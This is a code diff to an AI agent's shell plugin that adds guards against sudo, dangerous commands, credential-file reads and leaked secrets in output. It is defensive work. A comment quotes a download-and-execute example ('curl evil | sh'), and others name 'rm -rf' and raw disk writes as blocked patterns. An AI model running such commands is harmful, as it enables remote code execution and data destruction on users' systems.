@@ -1,6 +1,7 @@
 using System.ComponentModel;
 using System.Text.RegularExpressions;
 using Microsoft.Extensions.AI;
+using Microsoft.Extensions.FileSystemGlobbing;
 using fuseraft.Core;
 using fuseraft.Core.Interfaces;
 using fuseraft.Core.Models;
@@ -91,6 +92,8 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
     private readonly IncludedRootsState _includedRoots;
     private readonly Func<string, Task<bool>>? _approveCommand;
     private readonly ShellPolicy? _shellPolicy;
+    private readonly bool _blockCredentialFiles;
+    private readonly Matcher? _denyMatcher;
     private readonly IEventSink? _eventSink;
     private readonly object _tempDirLock = new();
     private string? _sessionTempDir;
@@ -124,9 +127,10 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
     // Background job registry
     private readonly System.Collections.Concurrent.ConcurrentDictionary<string, BackgroundJob> _jobs = new();
 
-    private sealed class BackgroundJob(string jobId)
+    private sealed class BackgroundJob(string jobId, string? workingDirectory = null)
     {
         public string JobId { get; } = jobId;
+        public string? WorkingDirectory { get; } = workingDirectory;
         public System.Diagnostics.Process? Process { get; set; }
         public readonly System.Text.StringBuilder Output = new();
         public readonly object OutputLock = new();
@@ -288,13 +292,47 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
         try { originalProcess.Dispose(); } catch { /* already exited */ }
     }
 
-    public ShellPlugin(string? sandboxRoot = null, Func<string, Task<bool>>? approveCommand = null, ShellPolicy? shellPolicy = null, IEventSink? eventSink = null, IncludedRootsState? includedRoots = null)
+    public ShellPlugin(string? sandboxRoot = null, Func<string, Task<bool>>? approveCommand = null, ShellPolicy? shellPolicy = null, IEventSink? eventSink = null, IncludedRootsState? includedRoots = null, bool blockCredentialFiles = true, IReadOnlyList<string>? denyPatterns = null)
     {
+        _blockCredentialFiles = blockCredentialFiles;
         _sandboxRoot    = sandboxRoot is not null ? FuseraftPaths.ExpandPath(sandboxRoot) : null;
+        _denyMatcher    = FileSystemSandbox.BuildDenyMatcher(denyPatterns);
+        KnownSecretFiles.Track(_sandboxRoot, denyPatterns, includeHomeCredentials: blockCredentialFiles);
         _includedRoots  = includedRoots ?? IncludedRootsState.Empty;
         _approveCommand = approveCommand;
         _shellPolicy    = shellPolicy;
         _eventSink      = eventSink;
+    }
+
+    // What the model is allowed to see of a command's output: a denied file's patch body hidden (so
+    // `shell_run "git diff"` can't print a tracked .env that git_diff would refuse), then every known
+    // secret value masked. `workingDirectory` is where the command ran.
+    internal string ScrubOutput(string text, string? workingDirectory) =>
+        EnvSecretMasker.Mask(ScrubPatches(text, workingDirectory));
+
+    private string Present(ProcessResult result, string? workingDirectory) =>
+        (_denyMatcher is null ? result : result with
+        {
+            Stdout = ScrubPatches(result.Stdout, workingDirectory),
+            Stderr = ScrubPatches(result.Stderr, workingDirectory),
+        }).ToPluginOutput();
+
+    private string ScrubPatches(string text, string? workingDirectory) =>
+        _denyMatcher is not null && GitDeniedContentFilter.ContainsPatch(text)
+            ? GitDeniedContentFilter.HideDeniedSections(text, RepoTopLevel(workingDirectory), _denyMatcher, _sandboxRoot, out _)
+            : text;
+
+    // Diff paths are relative to the repository top-level. Walking up to the nearest `.git` finds it
+    // without spawning a process (and handles worktrees/submodules, where `.git` is a file).
+    private string RepoTopLevel(string? workingDirectory)
+    {
+        var start = workingDirectory ?? _sandboxRoot ?? Directory.GetCurrentDirectory();
+        for (var dir = new DirectoryInfo(start); dir is not null; dir = dir.Parent)
+        {
+            var git = Path.Combine(dir.FullName, ".git");
+            if (Directory.Exists(git) || File.Exists(git)) return dir.FullName;
+        }
+        return start;
     }
 
     public void Dispose()
@@ -325,6 +363,9 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
 
         var sudoDenial = CheckForSudo(command);
         if (sudoDenial is not null) return sudoDenial;
+
+        var dangerDenial = CheckForDangerousCommand(command);
+        if (dangerDenial is not null) return dangerDenial;
 
         var policyDenial = CheckShellPolicy(command);
         if (policyDenial is not null) return policyDenial;
@@ -382,7 +423,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
                 resolvedDir, timeoutSeconds);
         }
 
-        var output = result.ToPluginOutput();
+        var output = Present(result, resolvedDir);
         _lastRunKey    = cacheKey;
         _lastRunOutput = output;
 
@@ -477,6 +518,9 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
         var sudoDenial = CheckForSudo(script);
         if (sudoDenial is not null) return sudoDenial;
 
+        var dangerDenial = CheckForDangerousCommand(script);
+        if (dangerDenial is not null) return dangerDenial;
+
         var policyDenial = CheckShellPolicy(script);
         if (policyDenial is not null) return policyDenial;
 
@@ -522,7 +566,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
                 }
             });
 
-            return result.ToPluginOutput();
+            return Present(result, resolvedDir);
         }
         finally
         {
@@ -532,8 +576,14 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
 
     // Environment helpers
 
-    [Description("Get an environment variable value.")]
-    public string GetEnv([Description("Variable name.")] string name) => Environment.GetEnvironmentVariable(name) ?? string.Empty;
+    [Description("Get an environment variable value. Values of secret-looking variables (KEY/TOKEN/SECRET/PASSWORD names) are hidden — reference them as $NAME in commands instead.")]
+    public string GetEnv([Description("Variable name.")] string name)
+    {
+        var value = Environment.GetEnvironmentVariable(name) ?? string.Empty;
+        return value.Length > 0 && EnvSecretMasker.IsSensitiveName(name)
+            ? EnvSecretMasker.Placeholder
+            : EnvSecretMasker.Mask(value);
+    }
 
     [Description("Set an environment variable for this session.")]
     public string SetEnv(
@@ -595,6 +645,9 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
         var sudoDenial = CheckForSudo(command);
         if (sudoDenial is not null) return sudoDenial;
 
+        var dangerDenial = CheckForDangerousCommand(command);
+        if (dangerDenial is not null) return dangerDenial;
+
         var policyDenial = CheckShellPolicy(command);
         if (policyDenial is not null) return policyDenial;
 
@@ -605,7 +658,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
         if (denial is not null) return denial;
 
         var jobId      = Guid.NewGuid().ToString("N")[..8];
-        var job        = new BackgroundJob(jobId);
+        var job        = new BackgroundJob(jobId, resolvedDir);
         var workingDir = resolvedDir ?? Directory.GetCurrentDirectory();
 
         var script = string.Empty;
@@ -651,7 +704,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
 
         if (job.IsRunning)
         {
-            var recent = TailOutput(job.ReadOutput(), 500);
+            var recent = TailOutput(ScrubOutput(job.ReadOutput(), job.WorkingDirectory), 500);
             return $"[RUNNING] Job {jobId}\n{(string.IsNullOrEmpty(recent) ? "(no output yet)" : $"Recent output:\n{recent}")}";
         }
 
@@ -659,7 +712,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
             return $"[KILLED] Job {jobId} was terminated.";
 
         var exitCode = job.ExitCode ?? -1;
-        var tail     = TailOutput(job.ReadOutput(), 1000);
+        var tail     = TailOutput(ScrubOutput(job.ReadOutput(), job.WorkingDirectory), 1000);
         return exitCode == 0
             ? $"[COMPLETED] Job {jobId} exited 0 (success).\n{tail}"
             : $"[FAILED] Job {jobId} exited {exitCode}.\n{tail}";
@@ -674,7 +727,7 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
 
         await job.EnsureDrainedAsync(JobDrainTimeout);
 
-        var output = job.ReadOutput();
+        var output = ScrubOutput(job.ReadOutput(), job.WorkingDirectory);
         return string.IsNullOrEmpty(output)
             ? PluginResult.Info($"Job {jobId}: no output captured yet.")
             : output;
@@ -710,6 +763,47 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
 
     // Helpers
 
+    private static readonly Regex WhitespaceRun = new(@"\s+", RegexOptions.Compiled);
+
+    // Line continuations ("\<newline>") join lines in the shell, so they must not split a phrase.
+    private static string CollapseWhitespace(string s) =>
+        WhitespaceRun.Replace(DangerousCommandDetector.Normalize(s).Replace("\\\n", " "), " ");
+
+    // AllowMode "segments": every simple command in the string must start with an allow pattern, so a
+    // command that merely *contains* an allowed phrase (`go test; curl evil | sh`) is rejected. See
+    // ShellPolicy.AllowMode and DangerousCommandDetector.EnumerateCommands.
+    private static string? CheckAllowPerSegment(string commandOrScript, IReadOnlyList<string> allow)
+    {
+        var commands = DangerousCommandDetector.EnumerateCommands(commandOrScript);
+        if (commands is null)
+            return PluginResult.Denied(
+                "Shell command blocked: it has a command substitution ($( ) or backticks) inside a quoted " +
+                "argument, which can't be checked against the allow list (AllowMode: segments). Move the " +
+                "substitution outside the quotes, or split it into separate commands.");
+
+        var patterns = allow.Select(CollapseWhitespace).ToList();
+        foreach (var command in commands)
+        {
+            var text = CollapseWhitespace(command.Text);
+            if (patterns.Any(p => StartsWithCommandPattern(text, p))) continue;
+
+            var shown = text.Length > 80 ? text[..80] + "…" : text;
+            return PluginResult.Denied(
+                $"Shell command blocked: '{shown}' is not matched by any configured allow pattern " +
+                "(AllowMode: segments — every command in a pipeline or sequence must match one). " +
+                $"Allowed: {string.Join(", ", allow.Select(p => $"'{p}'"))}.");
+        }
+        return null;
+    }
+
+    // Prefix match on a word boundary: "go test" matches "go test ./..." but not "go testing".
+    private static bool StartsWithCommandPattern(string text, string pattern) =>
+        pattern.Length > 0
+        && text.StartsWith(pattern, StringComparison.OrdinalIgnoreCase)
+        && (text.Length == pattern.Length
+            || char.IsWhiteSpace(pattern[^1])
+            || char.IsWhiteSpace(text[pattern.Length]));
+
     // Checks the command against the configured ShellPolicy allow/deny lists.
     // Deny is evaluated first; a matching deny pattern blocks the command regardless of allow.
     // Allow is only evaluated when the allow list is non-empty; the command must contain at
@@ -719,20 +813,29 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
     {
         if (_shellPolicy is null) return null;
 
+        // Compared after folding typography and collapsing whitespace runs on both sides, so
+        // `rm  -rf` (two spaces), a tab, a line continuation or a zero-width character can't
+        // sidestep a pattern that reads `rm -rf`. Still a substring match — reordered flags
+        // (`rm -fr`) are what DangerousCommandDetector's tokenizer is for.
+        var text = CollapseWhitespace(commandOrScript);
+
         if (_shellPolicy.Deny is { Count: > 0 })
         {
             foreach (var pattern in _shellPolicy.Deny)
             {
-                if (commandOrScript.Contains(pattern, StringComparison.OrdinalIgnoreCase))
+                if (text.Contains(CollapseWhitespace(pattern), StringComparison.OrdinalIgnoreCase))
                     return PluginResult.Denied(
                         $"Shell command blocked: matches configured deny pattern '{pattern}'.");
             }
         }
 
+        if (_shellPolicy.Allow is { Count: > 0 } && _shellPolicy.AllowSegments)
+            return CheckAllowPerSegment(commandOrScript, _shellPolicy.Allow);
+
         if (_shellPolicy.Allow is { Count: > 0 })
         {
             bool allowed = _shellPolicy.Allow.Any(p =>
-                commandOrScript.Contains(p, StringComparison.OrdinalIgnoreCase));
+                text.Contains(CollapseWhitespace(p), StringComparison.OrdinalIgnoreCase));
             if (!allowed)
                 return PluginResult.Denied(
                     $"Shell command blocked: not matched by any configured allow pattern. " +
@@ -749,17 +852,78 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
             System.Text.RegularExpressions.RegexOptions.Multiline |
             System.Text.RegularExpressions.RegexOptions.Compiled);
 
-    private static string? CheckForSudo(string commandOrScript)
+    // The regex is kept as a backstop (it also catches a `sudo` at the start of a line inside a
+    // heredoc or script body, which the tokenizer deliberately treats as data), so nothing that was
+    // blocked before is allowed now. DangerousCommandDetector's PrivilegeEscalation rule adds the
+    // spellings a regex can't see — see CheckForDangerousCommand.
+    private static string? CheckForSudo(string commandOrScript) =>
+        SudoPattern.IsMatch(commandOrScript) ? SudoDenied("sudo") : null;
+
+    private static string SudoDenied(string name) =>
+        PluginResult.Denied(
+            $"{name} is not permitted. " +
+            "Prefer non-privileged alternatives: pip install --user, python -m pip install --user, " +
+            "pipx, or a virtual environment (python -m venv .venv && .venv/bin/pip install ...). " +
+            "If elevated privileges are truly required, tell the user exactly which command to run " +
+            "and they will run it themselves.");
+
+    // Hard-denies the few commands that are never a legitimate unattended agent action
+    // (catastrophic recursive delete, raw block-device writes, download-and-execute) — see
+    // DangerousCommandDetector. Same posture as the sudo denial above, and likewise not lifted
+    // by --yolo or an empty ShellPolicy: those relax *approval*, not this.
+    private string? CheckForDangerousCommand(string commandOrScript, bool credentialFilesOnly = false)
     {
-        if (SudoPattern.IsMatch(commandOrScript))
+        if (DangerousCommandDetector.Detect(commandOrScript, _blockCredentialFiles, credentialFilesOnly) is not { } danger) return null;
+
+        if (danger.RuleId == DangerousCommandDetector.PrivilegeEscalation)
+            return SudoDenied(danger.Detail ?? "sudo");
+
+        // Same guidance the FileSystem plugin gives for a denied credentials path.
+        if (danger.RuleId == DangerousCommandDetector.CredentialFile)
             return PluginResult.Denied(
-                "sudo is not permitted. " +
-                "Prefer non-privileged alternatives: pip install --user, python -m pip install --user, " +
-                "pipx, or a virtual environment (python -m venv .venv && .venv/bin/pip install ...). " +
-                "If elevated privileges are truly required, tell the user exactly which command to run " +
-                "and they will run it themselves.");
+                $"Shell command blocked: it names '{danger.Detail}', a credentials file " +
+                $"({DangerousCommandDetector.CredentialFile}). Do not read, copy, or inspect it directly — " +
+                "if a command needs its contents, let that command read the file itself " +
+                "(e.g. `ssh`/`git` pick up your keys on their own). If you truly need this file, " +
+                "tell the user which command to run and they will run it themselves.");
+
+        return PluginResult.Denied(
+            $"Shell command blocked: it {danger.Reason} ({danger.RuleId}). " +
+            "Use a narrower, targeted command instead. If this is genuinely what is needed, " +
+            "tell the user exactly which command to run and they will run it themselves.");
+    }
+
+    /// <summary>
+    /// The gate every command or snippet runs through before it may execute, for plugins that run
+    /// things on this plugin's behalf (<c>Probe</c>): the <c>sudo</c> block, the dangerous-command and
+    /// credential-file guards, <c>ShellPolicy</c> allow/deny, and HITL approval — in the same order
+    /// <see cref="RunAsync"/> applies them. Returns a <c>[DENIED]</c> message, or <c>null</c> to proceed.
+    /// </summary>
+    /// <param name="shellSyntax">
+    /// <c>true</c> for POSIX shell text. <c>false</c> for code in another language, where only the
+    /// credential-file check applies (the shell-specific rules don't parse Python) alongside the policy
+    /// and approval steps — an <c>Allow</c> list, which names shell commands, naturally rejects snippets.
+    /// </param>
+    internal async Task<string?> VetAsync(string commandOrScript, bool shellSyntax = true)
+    {
+        // The sudo check is a pattern over shell text; in a Python string "; sudo" is just characters.
+        if (shellSyntax && CheckForSudo(commandOrScript) is { } sudoDenial) return sudoDenial;
+
+        var dangerDenial = CheckForDangerousCommand(commandOrScript, credentialFilesOnly: !shellSyntax);
+        if (dangerDenial is not null) return dangerDenial;
+
+        var policyDenial = CheckShellPolicy(commandOrScript);
+        if (policyDenial is not null) return policyDenial;
+
+        if (_approveCommand is not null && !await _approveCommand(commandOrScript))
+            return PluginResult.Denied("Shell command blocked by user.");
+
         return null;
     }
+
+    /// <summary>The sandbox check <see cref="RunAsync"/> applies to <c>workingDirectory</c>, for sibling plugins.</summary>
+    internal string? ValidateDirectory(string? directory, out string? resolved) =>
+        ValidateWorkingDirectory(directory, out resolved);
 
     // Validates that the working directory stays within the sandbox.
     // When a sandbox is active and no directory is specified, defaults to the sandbox root
